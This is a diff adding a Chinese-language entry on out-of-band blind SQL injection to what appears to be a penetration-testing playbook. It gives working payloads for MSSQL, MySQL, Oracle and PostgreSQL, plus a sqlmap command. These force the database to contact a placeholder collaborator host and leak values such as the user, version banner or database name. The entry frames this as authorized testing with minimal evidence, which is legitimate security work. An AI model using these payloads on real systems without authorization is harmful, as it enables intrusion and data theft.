@@ -1282,6 +1282,63 @@ MySQL: ' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--
 
 ---
 
+### 带外盲注（OOB/DNS外带）  `sqli-oob`
+完全无回显、无时间差异时的带外确认与提取技术
+子类：**盲注** · tags: `sqli` `blind` `oob` `dns`
+
+**前置条件：** 存在SQL注入但页面无回显、无布尔差异、时间盲不可靠；engagement 已显式允许 OAST（`allowed_methods` 含 `oast`）；使用研究者控制的 Interactsh/Collaborator 域
+
+**攻击链：**
+
+**1. MSSQL — UNC 路径触发外带**
+_xp_dirtree / OPENROWSET 强制 SMB/DNS 解析_
+```
+'; EXEC master..xp_dirtree '\\<collaborator>\a'--
+'; EXEC master..xp_fileexist '\\<collaborator>\a'--
+'; INSERT OPENROWSET('SQLOLEDB','http://<collaborator>','select 1') SELECT 1--
+（需堆叠注入；仅证明带外通道，不回传敏感数据）
+```
+
+**2. MySQL — LOAD_FILE UNC（仅 Windows）**
+_通过 SMB 共享路径触发 DNS_
+```
+' AND LOAD_FILE('\\\\<collaborator>\\a')--
+（Linux 后端无效；secure_file_priv 可能阻断，失败则回退时间盲）
+```
+
+**3. Oracle — UTL_HTTP / UTL_INADDR / HTTPURITYPE**
+_数据库服务器主动发起 DNS/HTTP 请求_
+```
+' UNION SELECT UTL_HTTP.REQUEST('http://<collaborator>/'||(SELECT user FROM dual)),NULL FROM DUAL--
+' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('<collaborator>.'||user||'.oob') FROM dual) IS NOT NULL--
+' AND (SELECT HTTPURITYPE('http://<collaborator>/ '||user).getclob() FROM dual) IS NOT NULL--
+```
+
+**4. PostgreSQL — dblink / COPY TO PROGRAM（谨慎）**
+_dblink 扩展触发带外解析_
+```
+' AND (SELECT dblink_send_query('host=<collaborator> dbname=a user=b', 'select 1') IS NOT NULL)--
+（dblink 需已安装；COPY TO PROGRAM 属 RCE 级别，禁止在 P4 使用）
+```
+
+**5. 数据提取（仅授权范围内，1-2 行作为证据）**
+_把单个值拼进子域，按字符或整值外带_
+```
+' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('<collaborator>.'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual) IS NOT NULL--
+MSSQL: '; DECLARE @d varchar(200); SELECT @d=(SELECT DB_NAME()); EXEC master..xp_dirtree '\\'+REPLACE(@d,'.','.')+'.<collaborator>\\a'--
+```
+
+**6. sqlmap 带外模式**
+_让 sqlmap 复用带外通道确认与提取_
+```
+VHS_SQLMAP_PRESET=blind bash scripts/sqlmap.sh -u "<url>" --dns-domain=<collaborator-domain> --batch --technique=BT
+（wrapper 已拒绝 --os-shell/--os-pwn；带外数据提取量以最小证据为限）
+```
+
+**证据要点：** 记录 collaborator 命中截图/导出、payload 原文、数据库类型推断依据；外带内容仅取 1-2 行证明读取能力，不做批量拖库。
+
+---
+
 ### 报错注入  `sqli-error-based`
 利用错误信息提取数据的SQL注入
 子类：**报错注入** · tags: `sqli` `error` `extractvalue`
